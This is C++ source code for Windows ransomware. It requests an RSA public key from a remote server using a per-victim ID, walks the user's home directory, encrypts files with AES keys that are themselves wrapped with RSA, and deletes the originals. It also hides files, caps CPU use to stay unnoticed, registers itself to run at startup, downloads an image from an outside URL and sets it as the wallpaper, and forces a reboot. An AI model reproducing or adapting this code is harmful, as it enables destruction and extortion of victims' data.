#include "Encryption.h"
#include <algorithm>
#include <stdexcept>
#define LIMIT_CPU_FAIL 0

#define VM 0

using namespace boost::filesystem;
using std::string;

Status encrypt(string path, RsaEncryptor& encryptor);

string get_username();
void test();
void notify();
static DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);
DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key);
void changeHiddenFileState(bool state);
void destroyVSS();
static void iterate(const path& parent,
	RsaEncryptor& rsaEncryptor,
	std::vector<string>& processedPaths);
Status changeWallPaper(const string&);
Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob);
void doRestart();
void makeFileHidden(string path);
void RegisterProgram();

Status getPublicParams(string id, string& mod, string& pubKey, bool fromStart);

Status getPublicParams(string id, string& mod, string& pubKey,bool fromStart)
{	
	string chunk;
	Status status = STATUS_SUCCESS;
	if(fromStart)
	{
		string url = URL_PUBLIC_RSA + id;
		
		status = getFromServer(url, chunk);
	}
	else
	{
		std::fstream pubFile;
		string pathToENC = get_path_to_ENC();
		pubFile.open(pathToENC, std::ios::in);
		if (!pubFile.is_open())
		{
			std::cout << "Failed to open " + pathToENC + ": " << GetLastError() << std::endl;
			return STATUS_UNSUCCESSFUL;
		}
		chunk = std::string((std::istreambuf_iterator<char>(pubFile)), std::istreambuf_iterator<char>());
		pubFile.close();
	}


	parsePublicKey(chunk, mod, pubKey);
	return status;
}

int encryption_main( bool fromStart) {
//	crypt_data* d = generatekey();//TODO also move to encrypt

	string mod;
	string pubKey;
	string path = ROOT_DIR;
	string pathToImage = get_path_to_jpeg();

#if VM
	if(fromStart)
	{
		RegisterProgram();
	}
#endif
	changeHiddenFileState(false);

	string pathToID = get_path_to_id();
	string pathToENC = get_path_to_ENC();

	//TODO set SquanchedID and IMAGE invisible
	std::fstream IDFile, pubFile;
	Status status;
	PBYTE id = nullptr;
	string strID;
	HANDLE hCurrentProcess = nullptr;
	HANDLE hJob = nullptr;
	vector<string> processed;
	string fileRead;
	RsaEncryptor rsaEncryptor;
	/* let's begin*/


	 id = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ID_LEN);
	if (NULL == id) {
		goto CLEAN;
	}
	status = BCryptGenRandom(NULL, id, ID_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if(!NT_SUCCESS(status))
	{
		goto CLEAN;
	}
	
	strID.assign((char*)id, ID_LEN);
	strID = string_to_hex(strID);


	status = getPublicParams(strID, mod, pubKey, fromStart);

	if(!NT_SUCCESS(status))
	{
		goto CLEAN;
	}


	status = LimitCPU(hCurrentProcess, hJob);
	if(LIMIT_CPU_FAIL == status)
	{
		goto CLEAN;
	}
	if (fromStart){
		pubFile.open(pathToENC, std::ios::out);
		if (!pubFile.is_open())
		{
			std::cout << "Failed to open " + pathToENC + ": " << GetLastError() << std::endl;
			return -1;
		}
		pubFile << "<Modulus>" << mod << "</Modulus><Exponent>" << pubKey << "</Exponent>";
		pubFile.close();
		makeFileHidden(pathToENC);

		IDFile.open(pathToID, std::ios::out);
		if(!IDFile.is_open())
		{
			std::cout << "Failed to open " + pathToID + ": " << GetLastError() << std::endl;
			return -1;
		}
		IDFile << NOT_FINISHED_ENCRYPTION;
		IDFile.write((char*)id, ID_LEN);
		IDFile.close();
		makeFileHidden(pathToID);
	}
#ifndef DEBUG
	string path = get_home();
#endif
	
	rsaEncryptor.init_Encryptor(mod, pubKey);
	iterate(path, rsaEncryptor, processed);
	for(auto& path : processed)
	{
		remove(path);
	}
	IDFile.open(pathToID, std::ios::in | std::ios::out);
	if (!IDFile.is_open())
	{
		std::cout << "Failed to open file: " << GetLastError() << std::endl;
	}
	fileRead = string((std::istreambuf_iterator<char>(IDFile)), std::istreambuf_iterator<char>());
	IDFile.seekp(0);
	fileRead[0] = FINISHED_ENCRYPTION;
	IDFile << fileRead;
	IDFile.close();

	download_jpeg(pathToImage, R"(https://i.redd.it/ep77fc6dceey.jpg)");
	makeFileHidden(pathToImage);
	changeHiddenFileState(true);

#if VM
	changeWallPaper(pathToImage);//TODO move to notify
#endif

CLEAN:
	if (id)
		HeapFree(GetProcessHeap(), 0, id);
#if VM
	doRestart();
#endif
	return 0;
}

/*usefull functions =]] */

void makeFileHidden(string path)
{
	DWORD attributes = GetFileAttributes(path.c_str());
	SetFileAttributes(path.c_str(), attributes + FILE_ATTRIBUTE_HIDDEN);
}


void changeHiddenFileState(bool state)
{
	SHELLSTATE ss;
	ZeroMemory(&ss, sizeof(ss));
	ss.fShowAllObjects = state;
	ss.fShowSysFiles = state;
	ss.fShowSuperHidden = state;
	SHGetSetSettings(&ss, SSF_SHOWALLOBJECTS | SSF_SHOWSYSFILES | SSF_SHOWSUPERHIDDEN, TRUE);
}

DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
{
	DWORD status = STATUS_INVALID_HANDLE;
	*iv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if (!(*iv)) {
		return STATUS_UNSUCCESSFUL;
	}
	*key = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN);
	if(!(*key)) {
		return STATUS_UNSUCCESSFUL;
	}
	status = BCryptGenRandom(NULL, *iv, IV_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if(!NT_SUCCESS(status)) {
		return status;
	}
	status = BCryptGenRandom(NULL, *key, KEY_LEN, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	return status;
}

bool initPlainText(string path, PBYTE *buffer, size_t buffSize)
{
	std::ifstream plaintextFile;
	plaintextFile.open(path, std::ios::binary);
	if (!plaintextFile.is_open()) {
		return false;
	}
	*buffer = new BYTE[buffSize + 1];
	if(nullptr == *buffer) {
		plaintextFile.close();
		return false;
	}
		
	char c;
	for (size_t i = 0; i < buffSize; ++i) {
		plaintextFile.get(c);
		(*buffer)[i] = c;
	}
	(*buffer)[buffSize] = '\0';
	plaintextFile.close();
	return true;
}

void writeToFile(string path, PBYTE cipherText, DWORD cipherLen, PBYTE keyIV, size_t plainTextSize)
{
	unsigned short paddingSize = IV_LEN - (plainTextSize % IV_LEN);
	char paddingSizeCStr[IV_DIGITS_NUM + 1] = { 0 }; 
	snprintf(paddingSizeCStr, IV_DIGITS_NUM + 1, "%02d", paddingSize);
	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
	ofile.write(paddingSizeCStr, IV_DIGITS_NUM);
	ofile.write((char*)keyIV, ENCRYPTED_KEY_IV_LEN);
	ofile.write((char*)cipherText, cipherLen);
	makeFileHidden(path + LOCKED_EXTENSION);
	ofile.close();
}

DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle)
{
	DWORD status;

	status = BCryptOpenAlgorithmProvider(&aesHandle, BCRYPT_AES_ALGORITHM, NULL, 0);
	if(!NT_SUCCESS(status)) {
		return status;
	}
	ULONG res;
	char blockLen[50] ={0};
	status = BCryptGetProperty(aesHandle, BCRYPT_BLOCK_LENGTH, (PUCHAR)blockLen, 50,&res, 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	status = BCryptGenerateSymmetricKey(aesHandle, &keyHandle, NULL, 0, key, KEY_LEN, 0);
	if (!NT_SUCCESS(status)) {
		std::cout << "BAD KEY HANDLE" << std::endl;
		return status;

	}

	status = BCryptSetProperty(keyHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (!NT_SUCCESS(status)) {
		return status;
	}
	return status;
}

Status encrypt(string path, RsaEncryptor& encryptor)
{
	DWORD status;
	PBYTE plainText = nullptr;
	size_t plainTextLen = getFileSize(path);
	
	
	PBYTE iv = nullptr;
	PBYTE key = nullptr;

	BCRYPT_ALG_HANDLE aesHandle = nullptr;
	BCRYPT_KEY_HANDLE keyHandle = nullptr;

	PBYTE keyIVBuff = nullptr;
	PBYTE keyIV = nullptr;
	PBYTE cipherText = nullptr;
	if(!initPlainText(path, &plainText, plainTextLen)) {
		status = STATUS_UNSUCCESSFUL;
		goto CLEANUP;
	}

	status = generateKeyAndIV(&iv, &key);
	if(!NT_SUCCESS(status)) {
		goto CLEANUP;
	}
	//keep in persistant file
	
	status = getKeyHandle(key, keyHandle, aesHandle);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}
	DWORD cipherSize,resSize;
	//CHECK IF NEEDED V
	PBYTE tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
	if(NULL == tmpIv) {
		status = STATUS_UNSUCCESSFUL;
		goto CLEANUP;
	}
	memcpy(tmpIv, iv, IV_LEN);
	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, NULL, 0, &cipherSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}

	cipherText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
	if(NULL == cipherText) {
		status = STATUS_UNSUCCESSFUL;
		goto CLEANUP;
	}
	status = BCryptEncrypt(keyHandle, plainText, plainTextLen, NULL, tmpIv, IV_LEN, cipherText, cipherSize, &resSize, BCRYPT_BLOCK_PADDING);
	if (!NT_SUCCESS(status)) {
		goto CLEANUP;
	}
#ifdef DEBUG
	std::cout << "Ciphertext:\t" << cipherText << std::endl;
#endif

	keyIV = (PBYTE)HeapAlloc(GetProcessHeap(), 0, KEY_LEN + IV_LEN);
	if (keyIV == nullptr)
	{
		status = STATUS_UNSUCCESSFUL;
		goto CLEANUP;
	}
	memcpy(keyIV,key,KEY_LEN);
	memcpy(keyIV + KEY_LEN, iv, IV_LEN);
	
	keyIVBuff = encryptor.encrypt(keyIV, KEY_LEN + IV_LEN);
	if(!keyIVBuff)
	{
		status = STATUS_UNSUCCESSFUL;
		goto CLEANUP;
	}
	writeToFile(path, cipherText, cipherSize, keyIVBuff, plainTextLen);
	
CLEANUP:
	if(plainText)
		delete plainText;
	if (iv)
		HeapFree(GetProcessHeap(), 0, iv);
	if (key)
		HeapFree(GetProcessHeap(), 0, key);
	if (aesHandle)
		BCryptCloseAlgorithmProvider(aesHandle, 0);
	if (keyHandle)
		BCryptDestroyKey(keyHandle);
	if (cipherText)
		HeapFree(GetProcessHeap(), 0, cipherText);
	if(keyIV)
		HeapFree(GetProcessHeap(), 0, keyIV);
	if (keyIVBuff)
		HeapFree(GetProcessHeap(), 0, keyIVBuff);

	return status;
}

Status LimitCPU(HANDLE& hCurrentProcess, HANDLE& hJob)
{
	Status status;
	/* following will slow down the whole process*/
	hCurrentProcess = GetCurrentProcess();
	if (nullptr == hCurrentProcess)
	{
		return LIMIT_CPU_FAIL;
	}
	hJob = CreateJobObject(NULL, NULL);
	if (nullptr == hJob)
	{
		return LIMIT_CPU_FAIL;
	}
	status = AssignProcessToJobObject(hJob, hCurrentProcess);
	if (0 == status)
	{
		return LIMIT_CPU_FAIL;
	}
	JOBOBJECT_CPU_RATE_CONTROL_INFORMATION cpuInfo;
	status = QueryInformationJobObject(
		hJob,
		JobObjectCpuRateControlInformation,
		&cpuInfo,
		sizeof(cpuInfo),
		NULL);
	if (0 == status) {
		return LIMIT_CPU_FAIL;
	}
	cpuInfo.ControlFlags = JOB_OBJECT_CPU_RATE_CONTROL_HARD_CAP |
		JOB_OBJECT_CPU_RATE_CONTROL_ENABLE |
		JOB_OBJECT_CPU_RATE_CONTROL_NOTIFY;
	cpuInfo.CpuRate = (5 * 100);
	//5 is arbitrary, *100 is a way to normalize value based on documentation
	status = SetInformationJobObject(
		hJob,
		JobObjectCpuRateControlInformation,
		&cpuInfo,
		sizeof(cpuInfo)
	);
	return status;
}

Status changeWallPaper(const string& path)
{
	PVOID str = (PVOID)path.c_str();
	int return_value = SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE);
	if(!return_value)
	{
		return STATUS_UNSUCCESSFUL;
	}
	return STATUS_SUCCESS;
}

void doRestart()
{
	HANDLE hToken = NULL;
	LUID luid;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
	LookupPrivilegeValue("", SE_SHUTDOWN_NAME, &luid);
	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, 0);

	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}

BOOL RegisterMyProgramForStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args)
{
	HKEY hKey = NULL;
	LONG lResult = 0;
	BOOL fSuccess = TRUE;
	DWORD dwSize;

	const size_t count = MAX_PATH * 2;
	wchar_t szValue[count] = {};


	wcscpy_s(szValue, count, L"\"");
	wcscat_s(szValue, count, pathToExe);
	wcscat_s(szValue, count, L"\" ");

	if (args != NULL)
	{
		// caller should make sure "args" is quoted if any single argument has a space
		// e.g. (L"-name \"Mark Voidale\"");
		wcscat_s(szValue, count, args);
	}

	lResult = RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, (KEY_WRITE | KEY_READ), NULL, &hKey, NULL);

	fSuccess = (lResult == 0);

	if (fSuccess)
	{
		dwSize = (wcslen(szValue) + 1) * 2;
		lResult = RegSetValueExW(hKey, pszAppName, 0, REG_SZ, (BYTE*)szValue, dwSize);
		fSuccess = (lResult == 0);
	}

	if (hKey != NULL)
	{
		RegCloseKey(hKey);
		hKey = NULL;
	}

	return fSuccess;
}

void RegisterProgram()
{
	wchar_t szPathToExe[MAX_PATH];

	GetModuleFileNameW(NULL, szPathToExe, MAX_PATH);
	RegisterMyProgramForStartup(L"My_Program", szPathToExe, L"-foobar");
}

static void iterate(const path& parent,
	RsaEncryptor& rsaEncryptor,
	std::vector<string>& processedPaths)
{
	string path;
	directory_iterator end_itr;
	static long long sumSize;
	Status status = STATUS_SUCCESS;

	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
		path = itr->path().string();

		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
			if (is_valid_folder(path))
			{
				iterate(path, rsaEncryptor, processedPaths);
			}
		}
		else {
			if (!do_encrypt(path)) continue;//see TODO 2 rows below
			status = encrypt(path, rsaEncryptor);
			//TODO consider adding to "process" of encrypt, will cause an ugly wrapper for decrypt
			if(!NT_SUCCESS(status))
			{
				continue;
			}
			processedPaths.push_back(path);
			sumSize += file_size(path);
			if (processedPaths.size() > COUNT_THRESHOLD || sumSize >= SIZE_THRESHOLD)
			{
				for (auto& fileToDelete : processedPaths)
				{
					remove(fileToDelete);
				}
				sumSize = 0;
				processedPaths.clear();
			}
		}
	}
}
